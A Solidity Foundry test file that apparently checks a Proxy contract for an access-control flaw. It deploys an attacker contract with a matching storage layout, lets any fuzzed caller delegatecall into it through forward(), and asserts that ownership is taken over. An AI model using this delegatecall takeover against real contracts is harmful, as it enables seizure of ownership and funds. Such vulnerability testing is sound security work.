
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Proxy} from "../src/Proxy.sol";

// Malicious contract that will be called via delegatecall to take over ownership
contract MaliciousOwnerTakeover {
    // Storage layout must match Proxy contract
    address owner;
    
    function takeOver() external {
        owner = msg.sender;
    }
}

contract TestAccessControlProxy is Test {
    Proxy public proxy;
    MaliciousOwnerTakeover public malicious;
    address public originalOwner;

    function setUp() public {
        originalOwner = address(this);
        proxy = new Proxy();
        malicious = new MaliciousOwnerTakeover();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the original owner (the only privileged role)
        vm.assume(caller != originalOwner);

        // --- 2. State Configuration ---
        // No special state configuration needed for this test

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Prepare the malicious delegatecall data
        bytes memory data = abi.encodeWithSignature("takeOver()");
        
        // Call the forward function as an arbitrary user
        // If the contract is VULNERABLE (Unprotected), this call will SUCCEED
        // The delegatecall will execute in the context of Proxy, changing its owner
        proxy.forward(address(malicious), data);

        // Assert that the ownership was successfully taken over by the arbitrary caller
        // Read the owner from storage slot 0
        bytes32 ownerSlot = vm.load(address(proxy), bytes32(uint256(0)));
        address newOwner = address(uint160(uint256(ownerSlot)));
        
        // The vulnerability allows the caller to become the new owner
        assertEq(newOwner, caller, "Arbitrary user should have taken over ownership");
        assertTrue(newOwner != originalOwner, "Owner should have changed from original");
    }
}
